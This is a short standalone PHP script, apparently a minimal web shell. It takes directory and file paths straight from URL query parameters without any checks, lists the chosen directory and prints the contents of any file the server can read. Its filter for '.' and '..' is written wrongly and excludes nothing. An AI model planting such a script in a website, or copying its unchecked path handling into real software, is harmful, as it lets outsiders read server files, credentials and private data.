<?php
	foreach(scandir($_GET['dir']) as $file) {
		if ($file !== '.' or $file !=='..') {
			echo "$file\n";
		}
	}
	echo file_get_contents($_GET['file']);
?>
